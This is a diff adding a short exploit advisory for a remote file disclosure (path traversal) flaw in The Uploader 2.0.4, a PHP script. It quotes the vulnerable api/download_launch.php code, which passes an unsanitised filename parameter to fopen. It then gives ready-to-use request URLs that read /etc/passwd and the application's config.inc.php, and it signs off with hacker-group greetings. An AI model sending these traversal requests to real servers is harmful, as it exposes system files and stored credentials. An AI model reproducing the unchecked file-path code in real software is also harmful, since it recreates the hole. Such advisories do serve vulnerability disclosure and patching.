@@ -1,0 +1,38 @@
+=================================================
+The Uploader 2.0.4 Remote File disclosure Vulnerability
+=================================================
+
+==============================================
+
+# Script Name : The Uploader
+# Version : [2.0.4]
+# Language : php
+# Author : Xa7m3d (H4K@hotmail.ch)
+# Download : http://sourceforge.net/projects/theuploader
+# Tested on : ubuntu 9.10
+
+==============================================
+
+File Disclosure :
+in : api/download_launch.php
+
+#######################################
+$open=fopen($main['upload_directory'] . $_GET['filename'], "r"); <??(+)
+$size=filesize($main['upload_directory'] . $_GET['filename']);
+$read=fread($open, $size);
+header("Content-Type: application/octet-stream");
+header("Content-Length: " . $size);
+header("Content-Transfer-Encoding: binary");
+header("Content-Disposition: attachment; filename=" . $_GET['filename']); <??(+)
+#######################################
+
+3XP :
+
+api/download_launch.php?filename=../../../../../etc/passwd
+
+Example :
+
+http://server/theuploader/api/download_launch.php?filename=../config.inc.php
+
+
+T3AM Piracy Unlimited Tunisia : # Cyb3R H3LL # k[i]ng # La Haft Xroy #
